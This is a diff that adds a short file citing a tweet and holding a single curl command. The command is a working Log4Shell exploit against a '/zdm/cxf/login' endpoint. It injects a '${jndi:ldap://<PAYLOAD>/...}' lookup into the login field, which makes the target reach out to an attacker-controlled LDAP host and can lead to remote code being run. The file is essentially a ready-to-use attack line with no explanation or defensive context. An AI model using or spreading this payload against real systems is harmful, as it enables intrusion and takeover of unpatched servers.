@@ -1,0 +1,3 @@
+Source: https://twitter.com/twcsftech/status/1471716640606007299
+
+curl https://<TARGET>/zdm/cxf/login -H 'Referer: https://<TARGET>/zdm' -d 'login=${jndi:ldap://<PAYLOAD>/wibtio}&password=' -k 
